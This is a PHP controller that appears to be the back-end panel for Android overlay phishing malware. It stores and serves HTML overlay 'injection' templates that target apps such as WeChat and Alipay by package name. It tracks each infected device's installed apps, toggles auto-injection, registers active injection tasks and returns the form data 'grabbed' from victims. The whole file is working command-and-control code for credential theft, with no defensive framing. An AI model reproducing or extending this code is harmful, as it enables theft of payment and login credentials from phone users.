<?php
namespace app\controller;

use app\BaseController;
use think\facade\Db;
use think\facade\Request;

class InjectionController extends BaseController
{
    private static function localTplDir()
    {
        $dir = dirname(dirname(__DIR__)) . DIRECTORY_SEPARATOR . '注入';
        return is_dir($dir) ? $dir : false;
    }

    private static function scanHtmlFiles($dir, &$out, $baseDir)
    {
        $files = @scandir($dir);
        if (!is_array($files)) return;
        foreach ($files as $f) {
            if ($f === '.' || $f === '..') continue;
            $full = $dir . DIRECTORY_SEPARATOR . $f;
            if (is_dir($full)) {
                self::scanHtmlFiles($full, $out, $baseDir);
            } elseif (is_file($full)) {
                $ext = strtolower(substr($f, strrpos($f, '.')));
                if ($ext === '.html' || $ext === '.htm') {
                    $rel = ltrim(substr($full, strlen($baseDir)), DIRECTORY_SEPARATOR . '/');
                    $out[$rel] = $full;
                }
            }
        }
    }

    private static function readHtmlMeta($filePath, &$name, &$color)
    {
        $content = @file_get_contents($filePath, false, null, 0, 20000);
        if ($content === false || $content === '') return;
        if (preg_match('/<title[^>]*>([\s\S]*?)<\/title>/iu', $content, $m)) {
            $t = trim(html_entity_decode(strip_tags($m[1]), ENT_QUOTES | ENT_HTML5, 'UTF-8'));
            if ($t !== '') $name = $t;
        }
        if (preg_match('/<meta[^>]+name=["\']theme-color["\'][^>]+content=["\'](#[0-9a-fA-F]{3,8}|[a-zA-Z() ,\d#%]+)["\']/u', $content, $m)) {
            $color = trim($m[1]);
        } elseif (preg_match('/background(?:-color)?\s*:\s*(#[0-9a-fA-F]{3,8}|rgba?\([^)]+\)|[a-zA-Z]+)/u', $content, $m)) {
            $color = trim($m[1]);
        }
    }

    private static function localTplMap()
    {
        $map = [];
        $dir = self::localTplDir();
        if (!$dir) return $map;
        $allHtml = [];
        self::scanHtmlFiles($dir, $allHtml, $dir);
        $known = [
            'weixin.html'   => ['name' => '微信',        'package' => 'com.tencent.mm',              'country' => '中国', 'color' => '#07C160', 'type' => 'social_pay'],
            'zhifubao.html' => ['name' => '支付宝',      'package' => 'com.eg.android.AlipayGphone', 'country' => '中国', 'color' => '#1677FF', 'type' => 'pay_app'],
        ];
        $usedColors = ['#6366F1', '#8B5CF6', '#EC4899', '#14B8A6', '#F59E0B', '#EF4444', '#06B6D4', '#84CC16'];
        $ci = 0;
        foreach ($allHtml as $rel => $full) {
            $fname = basename($rel);
            $base  = substr($fname, 0, strrpos($fname, '.'));
            $dirTag = dirname($rel) !== '.' ? str_replace(DIRECTORY_SEPARATOR, '/', dirname($rel)) : '';
            $meta = $known[strtolower($fname)] ?? null;
            $name    = $meta['name']    ?? $base;
            $package = $meta['package'] ?? 'local.template.' . strtolower(preg_replace('/[^a-zA-Z0-9]+/', '.', $base));
            $country = $meta['country'] ?? ($dirTag ? $dirTag : '其他');
            $color   = $meta['color']   ?? $usedColors[($ci++) % count($usedColors)];
            $type    = $meta['type']    ?? 'local_html';
            self::readHtmlMeta($full, $name, $color);
            $mtime = @filemtime($full) ?: time();
            $tid = 'local:' . str_replace(DIRECTORY_SEPARATOR, '::', $rel);
            $map[$tid] = [
                'id'          => $tid,
                'templateId'  => $tid,
                'name'        => $name,
                'packageName' => $package,
                'country'     => $country,
                'icon'        => '',
                'color'       => $color,
                'file'        => '注入/' . str_replace(DIRECTORY_SEPARATOR, '/', $rel),
                'type'        => $type,
                'enabled'     => true,
                'visible'     => true,
                'created_at'  => date('Y-m-d H:i:s', $mtime),
                'updated_at'  => date('Y-m-d H:i:s', $mtime),
                '_local'      => true,
                '_file'       => $full,
            ];
        }
        return $map;
    }
    /**
     * GET /api/injection/templates
     * 获取注入模板列表
     */
    public function listTemplates()
    {
        // ================================================================
        //  后端双保险：如果请求带了 id / tplId / templateId / packageName
        //  这 4 个 query 参数之一，直接返回单条模板（含 html_content），
        //  防止路由顺序 / pattern 问题导致走到 listTemplates 拿不到内容
        // ================================================================
        $paramSingle =
            Request::param('id')
            ?: Request::param('tplId')
            ?: Request::param('templateId')
            ?: Request::param('template_id')
            ?: Request::param('packageName')
            ?: Request::param('package_name')
            ?: Request::get('id')
            ?: Request::get('tplId')
            ?: Request::get('templateId')
            ?: Request::get('template_id')
            ?: Request::get('packageName')
            ?: Request::get('package_name');
        if ($paramSingle) {
            return $this->getTemplate($paramSingle, $paramSingle);
        }
        $templates = [];
        try {
            $rows = Db::name('injection_templates')
                ->field('id, template_id, name, package_name, country, icon, color, file, type, enabled, visible, created_at, updated_at')
                ->order('id', 'asc')
                ->select()->toArray();

            $usedColors = ['#6366F1', '#8B5CF6', '#EC4899', '#14B8A6', '#F59E0B', '#EF4444', '#06B6D4', '#84CC16'];
            $ci = 0;
            foreach ($rows as $r) {
                $tid = $r['template_id'] ?? (!empty($r['id']) ? (string)$r['id'] : uniqid('tpl-'));
                $country = !empty($r['country']) ? trim($r['country']) : '其他';
                $color = !empty($r['color']) ? trim($r['color']) : $usedColors[($ci++) % count($usedColors)];
                $name = !empty($r['name']) ? trim($r['name']) : ('模板 #' . ($r['id'] ?? 0));
                $created_at = !empty($r['created_at']) && $r['created_at'] !== '0000-00-00 00:00:00'
                    ? $r['created_at']
                    : date('Y-m-d H:i:s', time() - ($r['id'] ?? 0) * 60);
                $updated_at = !empty($r['updated_at']) && $r['updated_at'] !== '0000-00-00 00:00:00'
                    ? $r['updated_at']
                    : $created_at;
                $templates[$tid] = [
                    'id'          => $tid,
                    'templateId'  => $tid,
                    'name'        => $name,
                    'packageName' => $r['package_name'] ?? '',
                    'package_name' => $r['package_name'] ?? '',
                    'country'     => $country,
                    'icon'        => $r['icon'] ?? '',
                    'color'       => $color,
                    'file'        => $r['file'] ?? '',
                    'type'        => !empty($r['type']) ? $r['type'] : 'overlay',
                    'enabled'     => (bool)($r['enabled'] ?? 1),
                    'visible'     => (bool)($r['visible'] ?? 1),
                    'created_at'  => $created_at,
                    'updated_at'  => $updated_at,
                ];
            }
        } catch (\Exception $e) {
            $templates = [];
        }

        $localMap = self::localTplMap();
        foreach ($localMap as $key => $t) {
            unset($t['_local'], $t['_file']);
            $tid = $t['templateId'];
            if (!isset($templates[$tid])) {
                $templates[$tid] = $t;
            }
        }

        return json(['success' => true, 'templates' => array_values($templates), 'data' => array_values($templates)]);
    }

    /**
     * GET /api/injection/template/:id
     * 获取单个模板
     */
    public function getTemplate($id = '', $templateId = '')
    {
        $tplId = $templateId ?: $id;

        if (strpos($tplId, 'local:') === 0) {
            $rel = str_replace('::', DIRECTORY_SEPARATOR, substr($tplId, 6));
            $dir = self::localTplDir();
            $full = $dir ? $dir . DIRECTORY_SEPARATOR . $rel : '';
            $content = '';
            if ($full && is_file($full)) {
                $content = @file_get_contents($full) ?: '';
            }
            $localMap = self::localTplMap();
            if (isset($localMap[$tplId])) {
                $t = $localMap[$tplId];
                unset($t['_local'], $t['_file']);
                if ($content !== '') {
                    $t['htmlContent'] = $content;
                    $t['html_content'] = $content;
                } elseif (isset($t['_file']) && is_file($t['_file'])) {
                    $c = @file_get_contents($t['_file']) ?: '';
                    $t['htmlContent'] = $c;
                    $t['html_content'] = $c;
                }
                return json([
                    'success'      => true,
                    'message'      => 'success',
                    'htmlContent'  => $content,
                    'html_content' => $content,
                    'data'         => $t,
                ]);
            }
            if ($full && is_file($full)) {
                $name = basename($rel);
                return json([
                    'success'      => true,
                    'htmlContent'  => $content,
                    'html_content' => $content,
                    'data'         => [
                        'id'           => $tplId,
                        'templateId'   => $tplId,
                        'name'         => $name,
                        'packageName'  => 'local.template.unknown',
                        'package_name' => 'local.template.unknown',
                        'country'      => '其他',
                        'icon'         => '',
                        'color'        => '#6366F1',
                        'file'         => '注入/' . str_replace(DIRECTORY_SEPARATOR, '/', $rel),
                        'type'         => 'local_html',
                        'enabled'      => true,
                        'visible'      => true,
                        'htmlContent'  => $content,
                        'html_content' => $content,
                    ],
                    'message' => 'success',
                ]);
            }
        }

        $r = null;
        $htmlContent = '';
        try {
            $tplIdSafe = (string)$tplId;
            $sql = "SELECT 
                      id, template_id, name, package_name, country, icon, color, file, type, 
                      enabled, visible, created_at, updated_at,
                      html_content AS html_content,
                      html_content AS htmlContent,
                      CAST(html_content AS CHAR(1000000) CHARACTER SET utf8mb4) AS html_content_raw,
                      LENGTH(html_content) AS html_bytes
                    FROM fisher_injection_templates
                    WHERE template_id = ? OR package_name = ? OR CAST(id AS CHAR) = ?
                    LIMIT 1";
            $rows = Db::query($sql, [$tplIdSafe, $tplIdSafe, $tplIdSafe]);
            if (!empty($rows[0])) {
                $r = $rows[0];
            }
            if (!$r) {
                $rows2 = Db::query("SELECT * FROM fisher_injection_templates WHERE id = ? LIMIT 1", [(int)$tplIdSafe]);
                if (!empty($rows2[0])) $r = $rows2[0];
            }
        } catch (\Exception $e) {
            try {
                $row1 = Db::name('injection_templates')->where('template_id', (string)$tplId)->find();
                if ($row1) $r = $row1;
                if (!$r) {
                    $row2 = Db::name('injection_templates')->where('package_name', (string)$tplId)->find();
                    if ($row2) $r = $row2;
                }
                if (!$r && ctype_digit((string)$tplId)) {
                    $row3 = Db::name('injection_templates')->where('id', (int)$tplId)->find();
                    if ($row3) $r = $row3;
                }
            } catch (\Exception $e2) { $r = null; }
        }

        if (!$r) {
            $localMap = self::localTplMap();
            foreach ($localMap as $t) {
                if (($t['packageName'] ?? '') === $tplId || ($t['name'] ?? '') === $tplId) {
                    $content = @file_get_contents($t['_file']) ?: '';
                    unset($t['_local'], $t['_file']);
                    $t['htmlContent'] = $content;
                    $t['html_content'] = $content;
                    return json([
                        'success'      => true,
                        'message'      => 'success',
                        'htmlContent'  => $content,
                        'html_content' => $content,
                        'data'         => $t,
                    ]);
                }
            }
            return json(['success' => false, 'message' => 'Template not found'], 404);
        }

        if (!empty($r['html_content_raw']))     $htmlContent = (string)$r['html_content_raw'];
        if ($htmlContent === '' && !empty($r['html_content'])) $htmlContent = (string)$r['html_content'];
        if ($htmlContent === '' && !empty($r['htmlContent']))  $htmlContent = (string)$r['htmlContent'];
        if ($htmlContent === '' && !empty($r['content']))      $htmlContent = (string)$r['content'];

        $usedColors = ['#6366F1','#8B5CF6','#EC4899','#14B8A6','#F59E0B','#EF4444','#06B6D4','#84CC16'];
        $color = !empty($r['color']) ? trim($r['color']) : $usedColors[(int)(crc32((string)$tplId) & 7)];
        $country = !empty($r['country']) ? trim($r['country']) : '其他';
        $name = !empty($r['name']) ? trim($r['name']) : ('模板 ' . ($r['id'] ?? ''));
        $tidOut = !empty($r['template_id']) ? (string)$r['template_id'] : (!empty($r['id']) ? (string)$r['id'] : (string)$tplId);
        $pkgOut = !empty($r['package_name']) ? (string)$r['package_name'] : '';
        $createdOut = (!empty($r['created_at']) && $r['created_at'] !== '0000-00-00 00:00:00') ? (string)$r['created_at'] : date('Y-m-d H:i:s');
        $updatedOut = (!empty($r['updated_at']) && $r['updated_at'] !== '0000-00-00 00:00:00') ? (string)$r['updated_at'] : $createdOut;

        $template = [
            'id'           => $tidOut,
            'templateId'   => $tidOut,
            'template_id'  => $tidOut,
            'name'         => $name,
            'packageName'  => $pkgOut,
            'package_name' => $pkgOut,
            'country'      => $country,
            'icon'         => !empty($r['icon']) ? (string)$r['icon'] : '',
            'color'        => $color,
            'file'         => !empty($r['file']) ? (string)$r['file'] : '',
            'type'         => !empty($r['type']) ? (string)$r['type'] : 'overlay',
            'htmlContent'  => $htmlContent,
            'html_content' => $htmlContent,
            'content'      => $htmlContent,
            'enabled'      => !empty($r['enabled']),
            'visible'      => !isset($r['visible']) || !empty($r['visible']),
            'created_at'   => $createdOut,
            'updated_at'   => $updatedOut,
            '_dbg_bytes'   => (int)($r['html_bytes'] ?? strlen($htmlContent)),
        ];

        return json([
            'success'      => true,
            'message'      => 'success',
            'htmlContent'  => $htmlContent,
            'html_content' => $htmlContent,
            'content'      => $htmlContent,
            'bytes'        => strlen($htmlContent),
            'data'         => $template,
        ]);
    }

    /**
     * POST /api/injection/template
     * 添加模板
     */
    public function addTemplate()
    {
        $data = Request::post();
        $name = trim($data['name'] ?? '');
        $packageName = trim($data['packageName'] ?? ($data['package_name'] ?? ''));

        if (!$name || !$packageName) {
            return json(['success' => false, 'message' => 'name 和 packageName 必填'], 400);
        }

        $templateId = trim($data['templateId'] ?? ($data['template_id'] ?? ''));
        if (!$templateId) {
            $templateId = $name . '_' . $packageName;
        }

        try {
            $dup = Db::name('injection_templates')->where('package_name', $packageName)->find();
            if ($dup) {
                return json(['success' => false, 'message' => '包名已存在，不能重复'], 409);
            }
        } catch (\Exception $e) {}

        $now = date('Y-m-d H:i:s');
        $htmlContent = $data['htmlContent'] ?? ($data['html_content'] ?? '');

        try {
            Db::name('injection_templates')->insert([
                'template_id'  => $templateId,
                'name'         => $name,
                'package_name' => $packageName,
                'country'      => $data['country'] ?? ($data['Country'] ?? '其他'),
                'icon'         => $data['icon'] ?? '',
                'color'        => $data['color'] ?? '#6366F1',
                'file'         => $data['file'] ?? '',
                'type'         => $data['type'] ?? 'overlay',
                'html_content' => $htmlContent,
                'enabled'      => isset($data['enabled']) ? ($data['enabled'] ? 1 : 0) : 1,
                'visible'      => isset($data['visible']) ? ($data['visible'] ? 1 : 0) : 1,
                'created_at'   => $now,
                'updated_at'   => $now,
            ]);
        } catch (\Exception $e) {
            try {
                Db::name('injection_templates')
                    ->where('template_id', $templateId)
                    ->update([
                        'name'         => $name,
                        'package_name' => $packageName,
                        'html_content' => $htmlContent,
                        'updated_at'   => $now,
                    ]);
            } catch (\Exception $e2) {
                return json(['success' => false, 'message' => '插入失败: ' . $e->getMessage()], 500);
            }
        }

        return json(['success' => true, 'data' => ['templateId' => $templateId], 'message' => 'success']);
    }

    /**
     * PUT /api/injection/template/:id  OR  PUT|POST /api/injection/template (body/query 参数)
     * 更新模板（双保险：优先从 body/query 取 id/templateId/packageName）
     */
    public function updateTemplate($id = '', $templateId = '')
    {
        // 【后端双保险】body / query / path 任何一种传了 id/templateId/packageName 都用
        $raw = @file_get_contents('php://input');
        $data = [];
        if ($raw) {
            $json = json_decode($raw, true);
            if (is_array($json)) $data = $json;
        }
        if (!$data) {
            $p = Request::param();
            if (is_array($p) && $p) $data = $p;
        }
        if (!$data) {
            $post = Request::post();
            if (is_array($post) && $post) $data = $post;
        }
        if (!$data) {
            $get = Request::get();
            if (is_array($get) && $get) $data = $get;
        }

        // 先用稳定的旧标识找当前行；packageName 是要保存的新包名，不优先拿来定位。
        $effectiveId =
            !empty($data['id'])                ? (string)$data['id']                :
            (!empty($data['templateId'])       ? (string)$data['templateId']        :
            (!empty($data['template_id'])      ? (string)$data['template_id']       :
            (!empty($data['originalTemplateId']) ? (string)$data['originalTemplateId'] :
            (!empty($data['original_template_id']) ? (string)$data['original_template_id'] :
            ($templateId ?: $id)))));
        $originalPackageName = trim((string)($data['originalPackageName'] ?? ($data['original_package_name'] ?? '')));
        $newPackageName = null;
        if (array_key_exists('packageName', $data) || array_key_exists('package_name', $data)) {
            $newPackageName = trim((string)($data['packageName'] ?? ($data['package_name'] ?? '')));
            if ($newPackageName === '') {
                return json(['success' => false, 'message' => '包名不能为空'], 400);
            }
        }

        $updates = [];
        if (isset($data['name']))         $updates['name']         = $data['name'];
        if ($newPackageName !== null)     $updates['package_name'] = $newPackageName;
        if (isset($data['country']))      $updates['country']      = $data['country'];
        if (isset($data['icon']))         $updates['icon']         = $data['icon'];
        if (isset($data['color']))        $updates['color']        = $data['color'];
        if (isset($data['file']))         $updates['file']         = $data['file'];
        if (isset($data['type']))         $updates['type']         = $data['type'];
        if (isset($data['htmlContent']))  $updates['html_content'] = $data['htmlContent'];
        if (isset($data['html_content'])) $updates['html_content'] = $data['html_content'];
        if (isset($data['content']))      $updates['html_content'] = $data['content'];
        if (isset($data['enabled']))      $updates['enabled']      = $data['enabled'] ? 1 : 0;
        if (isset($data['visible']))      $updates['visible']      = $data['visible'] ? 1 : 0;
        if ($updates) {
            $updates['updated_at'] = date('Y-m-d H:i:s');
        }

        $row = null;
        if ($effectiveId) {
            try { $row = Db::name('injection_templates')->where('template_id', (string)$effectiveId)->find(); } catch (\Exception $e) {}
            if (!$row) {
                try { $row = Db::name('injection_templates')->where('package_name', (string)$effectiveId)->find(); } catch (\Exception $e) {}
            }
            if (!$row && ctype_digit((string)$effectiveId)) {
                try { $row = Db::name('injection_templates')->where('id', (int)$effectiveId)->find(); } catch (\Exception $e) {}
            }
        }
        if (!$row && $originalPackageName !== '') {
            try { $row = Db::name('injection_templates')->where('package_name', $originalPackageName)->find(); } catch (\Exception $e) {}
        }
        if (!$row && $newPackageName !== null) {
            try { $row = Db::name('injection_templates')->where('package_name', $newPackageName)->find(); } catch (\Exception $e) {}
        }

        if (!$row) {
            return json(['success' => false, 'message' => '模板不存在'], 404);
        }

        if ($newPackageName !== null) {
            try {
                $dup = Db::name('injection_templates')
                    ->where('package_name', $newPackageName)
                    ->where('id', '<>', (int)$row['id'])
                    ->find();
                if ($dup) {
                    return json(['success' => false, 'message' => '包名已存在，不能重复'], 409);
                }
            } catch (\Exception $e) {}
        }

        if ($updates) {
            try {
                Db::name('injection_templates')->where('id', (int)$row['id'])->update($updates);
            } catch (\Exception $e) {
                return json(['success' => false, 'message' => '更新失败: ' . $e->getMessage()], 500);
            }
        }

        return json([
            'success' => true,
            'message' => 'success',
            'data'    => [
                'updates'   => array_keys($updates),
                'count'     => count($updates),
                'tplIdUsed' => $effectiveId,
                'packageName' => $newPackageName ?? ($row['package_name'] ?? ''),
            ],
        ]);
    }

    /**
     * DELETE /api/injection/templates/:id  OR  POST|DELETE /api/injection/template/delete (body/query 参数)
     * 删除模板（双保险：优先从 body/query 取 id/templateId/packageName）
     */
    public function deleteTemplate($id = '', $templateId = '')
    {
        $raw = @file_get_contents('php://input');
        $data = [];
        if ($raw) {
            $json = json_decode($raw, true);
            if (is_array($json)) $data = $json;
        }
        if (!$data) {
            $p = Request::param();
            if (is_array($p) && $p) $data = $p;
        }
        if (!$data) {
            $post = Request::post();
            if (is_array($post) && $post) $data = $post;
        }
        if (!$data) {
            $get = Request::get();
            if (is_array($get) && $get) $data = $get;
        }

        $effectiveId =
            !empty($data['id'])           ? (string)$data['id']           :
            (!empty($data['templateId'])  ? (string)$data['templateId']  :
            (!empty($data['template_id']) ? (string)$data['template_id'] :
            (!empty($data['packageName']) ? (string)$data['packageName'] :
            (!empty($data['package_name'])? (string)$data['package_name']:
            ($templateId ?: $id)))));

        try {
            if ($effectiveId) {
                $row = Db::name('injection_templates')->where('template_id', (string)$effectiveId)->find();
                if ($row) {
                    Db::name('injection_templates')->where('template_id', (string)$effectiveId)->delete();
                } else {
                    $row = Db::name('injection_templates')->where('package_name', (string)$effectiveId)->find();
                    if ($row) {
                        Db::name('injection_templates')->where('package_name', (string)$effectiveId)->delete();
                    } elseif (ctype_digit((string)$effectiveId)) {
                        Db::name('injection_templates')->where('id', (int)$effectiveId)->delete();
                    }
                }
            }
        } catch (\Exception $e) {}
        return json(['success' => true, 'data' => ['tplIdUsed' => $effectiveId], 'message' => 'success']);
    }

    /**
     * GET /api/injection/configs
     * 获取全局注入配置
     */
    public function listConfigs()
    {
        $configsMap = [];
        try {
            $rows = Db::name('injection_templates')->order('id', 'asc')->select()->toArray();
            foreach ($rows as $r) {
                $tid = $r['template_id'] ?? '';
                $configsMap[$tid] = [
                    'id'          => $tid,
                    'templateId'  => $tid,
                    'name'        => $r['name'],
                    'packageName' => $r['package_name'] ?? '',
                    'country'     => $r['country'] ?? '',
                    'icon'        => $r['icon'] ?? '',
                    'color'       => $r['color'] ?? '',
                    'enabled'     => (bool)($r['enabled'] ?? 0),
                    'visible'     => (bool)($r['visible'] ?? 1),
                    'autoInject'  => false,
                ];
            }
        } catch (\Exception $e) {
            $configsMap = [];
        }

        $localMap = self::localTplMap();
        foreach ($localMap as $base => $t) {
            unset($t['_local'], $t['_file'], $t['created_at'], $t['updated_at'], $t['file']);
            $t['autoInject'] = false;
            $tid = $t['templateId'];
            if (!isset($configsMap[$tid])) {
                $configsMap[$tid] = $t;
            }
        }
        $configs = array_values($configsMap);

        return json(['success' => true, 'configs' => $configs, 'data' => $configs]);
    }

    /**
     * POST /api/injection/config
     * 更新注入配置（启用/禁用/可见性）
     */
    public function updateConfig()
    {
        $data = Request::post();
        $templateId = $data['templateId'] ?? $data['template_id'] ?? '';

        if (!$templateId) {
            return json(['success' => false, 'message' => 'templateId required'], 400);
        }

        try {
            if (isset($data['enabled'])) {
                Db::name('injection_templates')
                    ->where('template_id', $templateId)
                    ->update(['enabled' => $data['enabled'] ? 1 : 0]);
            }
            if (isset($data['visible'])) {
                Db::name('injection_templates')
                    ->where('template_id', $templateId)
                    ->update(['visible' => $data['visible'] ? 1 : 0]);
            }
        } catch (\Exception $e) {}

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * GET /api/injection/grabbed-data?deviceId=xxx
     * 获取注入抓取的数据
     * Python 路由: /api/injection/data — 返回 ok({"list": result})
     * result 中每项: {id, deviceId, templateName, packageName, data, timestamp}
     */
    public function grabbedData()
    {
        $deviceId = Request::get('deviceId', '');

        if (!$deviceId) {
            return json(['success' => true, 'data' => [], 'message' => 'success']);
        }

        $result = [];
        try {
            $rows = Db::name('injection_data')
                ->where('device_id', $deviceId)
                ->order('created_at', 'desc')
                ->select()
                ->toArray();

            foreach ($rows as $r) {
                $formData = $r['form_data'] ?? $r['data_json'] ?? '{}';
                try {
                    $parsedData = json_decode($formData, true) ?: [];
                } catch (\Exception $e) {
                    $parsedData = [];
                }

                $createdAt = $r['created_at'] ?? 0;
                $timestamp = is_numeric($createdAt) ? (int)($createdAt * 1000) : $createdAt;

                $result[] = [
                    'id'           => $r['id'] ?? 0,
                    'deviceId'     => $r['device_id'] ?? '',
                    'templateName' => $r['template_name'] ?? $r['app_name'] ?? '',
                    'packageName'  => $r['package_name'] ?? $r['data_type'] ?? '',
                    'data'         => $parsedData,
                    'timestamp'    => $timestamp,
                ];
            }
        } catch (\Exception $e) {
            $result = [];
        }

        return json(['success' => true, 'data' => $result, 'message' => 'success']);
    }

    /**
     * GET /api/injection/active-tasks?deviceId=xxx
     * 获取设备当前活跃的注入任务
     * Python: 基于内存 dict active_injection_tasks[device_id].values()
     * 返回: {"success": true, "data": tasks, "message": "success"}
     * 由于 PHP 无内存状态，从 fisher_active_injection_tasks 表读取（如果有），否则返回空数组
     */
    public function activeTasks()
    {
        // POST: 注册活跃注入任务
        if (Request::isPost()) {
            $data = Request::post();
            $deviceId = $data['deviceId'] ?? '';
            $packageName = $data['packageName'] ?? '';
            $templateId = $data['templateId'] ?? '';
            if ($deviceId && $packageName) {
                try {
                    $taskJson = json_encode(['packageName' => $packageName, 'templateId' => $templateId, 'startedAt' => time()]);
                    // 去重：先删再插
                    Db::name('active_injection_tasks')
                        ->where('device_id', $deviceId)
                        ->where('package_name', $packageName)
                        ->delete();
                    Db::name('active_injection_tasks')->insert([
                        'device_id' => $deviceId,
                        'package_name' => $packageName,
                        'task_json' => $taskJson,
                        'created_at' => date('Y-m-d H:i:s'),
                    ]);
                } catch (\Exception $e) {
                    // 表可能不存在，忽略
                }
            }
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }

        // DELETE: 移除活跃注入任务
        if (Request::isDelete()) {
            $deviceId = Request::get('deviceId', '');
            $packageName = Request::get('packageName', '');
            if ($deviceId && $packageName) {
                try {
                    Db::name('active_injection_tasks')
                        ->where('device_id', $deviceId)
                        ->where('package_name', $packageName)
                        ->delete();
                } catch (\Exception $e) {}
            }
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }

        // GET: 查询活跃注入任务
        $deviceId = Request::get('deviceId', '');
        $tasks = [];
        $packages = [];
        $templateIds = [];

        if ($deviceId) {
            try {
                $rows = Db::name('active_injection_tasks')
                    ->where('device_id', $deviceId)
                    ->select()
                    ->toArray();
                foreach ($rows as $row) {
                    $taskData = json_decode($row['task_json'] ?? '{}', true);
                    if ($taskData) {
                        $tasks[] = $taskData;
                        if (!empty($taskData['packageName'])) $packages[] = $taskData['packageName'];
                        if (!empty($taskData['templateId'])) $templateIds[] = $taskData['templateId'];
                    }
                    // fallback: 直接用 package_name 字段
                    if (empty($taskData['packageName']) && !empty($row['package_name'])) {
                        $packages[] = $row['package_name'];
                    }
                }
            } catch (\Exception $e) {
                $tasks = [];
            }
        }

        return json(['success' => true, 'data' => $tasks, 'packages' => $packages, 'templateIds' => $templateIds, 'message' => 'success']);
    }

    /**
     * GET /api/injection/global-configs
     * 获取注入全局配置
     * Python 返回: jsonify({"success": True, "configs": configs})
     * 注意：无 "data" 和 "message" 字段！
     */
    public function globalConfigs()
    {
        $configsMap = [];
        try {
            $rows = Db::name('injection_templates')->order('id', 'asc')->select()->toArray();
            foreach ($rows as $r) {
                $tid = $r['template_id'] ?? '';
                $configsMap[$tid] = [
                    'id'          => $tid,
                    'templateId'  => $tid,
                    'htmlContent' => $r['html_content'] ?? '',
                    'packageName' => $r['package_name'] ?? '',
                    'name'        => $r['name'] ?? '',
                    'enabled'     => (bool)($r['enabled'] ?? 0),
                    'visible'     => (bool)($r['visible'] ?? 1),
                    'autoInject'  => false,
                ];
            }
        } catch (\Exception $e) {
            $configsMap = [];
        }

        $localMap = self::localTplMap();
        foreach ($localMap as $base => $t) {
            $content = @file_get_contents($t['_file']) ?: '';
            $tid = $t['templateId'];
            if (!isset($configsMap[$tid])) {
                $configsMap[$tid] = [
                    'id'          => $tid,
                    'templateId'  => $tid,
                    'htmlContent' => $content,
                    'packageName' => $t['packageName'],
                    'name'        => $t['name'],
                    'enabled'     => true,
                    'visible'     => true,
                    'autoInject'  => false,
                ];
            }
        }

        return json(['success' => true, 'configs' => array_values($configsMap)]);
    }

    /**
     * GET /api/device/:id/apps
     * 获取设备已安装应用列表
     * ★ 2026-09-19 修复：从 fisher_device_apps 读，兜底读 fisher_devices.other_info，合并去重
     */
    public function deviceApps($id)
    {
        $row = null;
        try {
            $row = Db::name('device_apps')->where('device_id', $id)->find();
        } catch (\Exception $e) {
            $row = null;
        }
        $injActive = true;
        $updatedAt = 0;
        $appsA = [];
        if ($row) {
            if (!empty($row['installed_apps'])) {
                $appsA = json_decode($row['installed_apps'], true) ?: [];
            }
            $injActive = isset($row['injection_active']) ? (bool)$row['injection_active'] : true;
            $updatedAt = (int)($row['updated_at'] ?? 0);
        }
        $appsB = [];
        try {
            $dev = Db::name('devices')->where('device_id', $id)->field('other_info')->find();
            if ($dev && !empty($dev['other_info'])) {
                $other = @json_decode($dev['other_info'], true) ?: [];
                if (isset($other['apps']) && is_array($other['apps'])) {
                    $appsB = $other['apps'];
                }
            }
        } catch (\Exception $e) {
            $appsB = [];
        }
        // 合并去重
        $byPkg = [];
        foreach (array_merge($appsA, $appsB) as $a) {
            if (!is_array($a)) continue;
            $key = !empty($a['packageName']) ? $a['packageName']
                 : (!empty($a['package'])      ? $a['package']
                 : (isset($a[0]) && is_string($a[0]) ? $a[0] : null));
            if ($key === null) $key = '_'.md5(json_encode($a, JSON_UNESCAPED_UNICODE));
            $byPkg[$key] = $a;
        }
        $apps = array_values($byPkg);
        return json([
            'success' => true,
            'data' => [
                'apps' => $apps,
                'total' => count($apps),
                'injection_active' => $injActive,
                'updated_at' => $updatedAt,
            ]
        ]);
    }

    /**
     * PUT /api/device/:id/auto-injection
     * 切换设备自动注入开关
     */
    public function toggleAutoInjection($id)
    {
        $data = Request::put();
        $active = isset($data['active']) ? ($data['active'] ? 1 : 0) : null;

        if ($active === null) {
            return json(['success' => false, 'message' => 'Missing active parameter'], 400);
        }

        try {
            $row = Db::name('device_apps')->where('device_id', $id)->find();
            $now = time();
            if ($row) {
                Db::name('device_apps')->where('device_id', $id)->update([
                    'injection_active' => $active,
                    'updated_at' => $now,
                ]);
            } else {
                Db::name('device_apps')->insert([
                    'device_id' => $id,
                    'injection_active' => $active,
                    'installed_apps' => null,
                    'updated_at' => $now,
                ]);
            }
        } catch (\Exception $e) {}

        return json([
            'success' => true,
            'data' => ['injection_active' => (bool)$active],
            'message' => $active ? 'Auto injection enabled' : 'Auto injection disabled'
        ]);
    }
}
